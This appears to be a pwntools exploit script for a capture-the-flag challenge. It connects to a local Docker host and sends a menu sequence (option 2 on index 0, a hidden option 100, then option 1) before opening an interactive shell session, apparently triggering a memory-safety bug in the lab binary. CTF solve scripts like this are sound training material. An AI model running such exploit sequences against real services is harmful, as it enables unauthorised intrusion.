#!/usr/bin/python
# -*- coding: UTF-8 -*-
from pwn import *
context.terminal = ['tmux', 'splitw', '-h']
context.log_level = "debug"

binary_path = "../dist/pwn"


# p = process(binary_path)
p = remote("172.17.0.2", 20000)

p.recvuntil("Your choice: ")
p.sendline("2")
p.recvuntil("Index: ")
p.sendline("0")

p.recvuntil("Your choice: ")
p.sendline("100")

p.recvuntil("Your choice: ")
p.sendline("1")
p.recvuntil("Index: ")
p.sendline("0")


p.interactive()
